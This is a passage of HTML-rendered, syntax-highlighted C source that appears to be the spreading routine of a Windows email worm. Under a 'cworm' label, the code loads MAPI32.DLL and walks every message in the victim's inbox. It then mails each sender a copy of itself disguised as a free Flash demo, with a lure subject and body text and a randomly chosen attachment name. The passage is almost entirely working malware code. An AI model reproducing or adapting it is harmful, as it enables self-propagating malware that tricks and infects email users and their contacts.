    </span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc11">htmf</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">SW_SHOWMAXIMIZED</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">


</span><span class="sc11">cworm</span><span class="sc10">:</span><span class="sc0">
</span><span class="sc11">hMAPI</span><span class="sc10">=</span><span class="sc11">LoadLibrary</span><span class="sc10">(</span><span class="sc6">"MAPI32.DLL"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">mLogon</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hMAPI</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPILogon"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">mLogoff</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hMAPI</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPILogoff"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">mFindNext</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hMAPI</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIFindNext"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">mReadMail</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hMAPI</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIReadMail"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">mSendMail</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hMAPI</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPISendMail"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">(</span><span class="sc11">FARPROC</span><span class="sc0"> </span><span class="sc10">&amp;)</span><span class="sc11">mFreeBuffer</span><span class="sc10">=</span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">hMAPI</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAPIFreeBuffer"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">mLogon</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">MAPI_NEW_SESSION</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,&amp;</span><span class="sc11">session</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mFindNext</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">MAPI_LONG_MSGID</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">)==</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">mReadMail</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">,</span><span class="sc11">MAPI_ENVELOPE_ONLY</span><span class="sc10">|</span><span class="sc11">MAPI_PEEK</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,&amp;</span><span class="sc11">mess</span><span class="sc10">)==</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">mname</span><span class="sc10">,</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">maddr</span><span class="sc10">,</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">ulReserved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszSubject</span><span class="sc10">=</span><span class="sc6">"New! New! Version of Flash"</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszNoteText</span><span class="sc10">=</span><span class="sc6">"Hi,\nLook at this demo version of Flash.\n\nIt's easy and free."</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszMessageType</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszDateReceived</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpszConversationID</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">flFlags</span><span class="sc10">=</span><span class="sc11">MAPI_SENT</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">ulReserved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">ulRecipClass</span><span class="sc10">=</span><span class="sc11">MAPI_ORIG</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">=</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpOriginator</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">=</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">nRecipCount</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">ulReserved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">ulRecipClass</span><span class="sc10">=</span><span class="sc11">MAPI_TO</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">=</span><span class="sc11">mname</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">=</span><span class="sc11">maddr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">nFileCount</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">=(</span><span class="sc11">MapiFileDesc</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiFileDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiFileDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">ulReserved</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">flFlags</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">nPosition</span><span class="sc10">=-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpszPathName</span><span class="sc10">=</span><span class="sc11">filename</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpszFileName</span><span class="sc10">=</span><span class="sc11">attname</span><span class="sc10">[</span><span class="sc11">GetTickCount</span><span class="sc10">()&amp;</span><span class="sc4">6</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpFileType</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">mSendMail</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">mess</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">mFindNext</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">,</span><span class="sc11">MAPI_LONG_MSGID</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">messId</span><span class="sc10">)==</span><span class="sc11">SUCCESS_SUCCESS</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">-&gt;</span><span class="sc11">lpFiles</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">mFreeBuffer</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">mLogoff</span><span class="sc10">(</span><span class="sc11">session</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">FreeLibrary</span><span class="sc10">(</span><span class="sc11">hMAPI</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
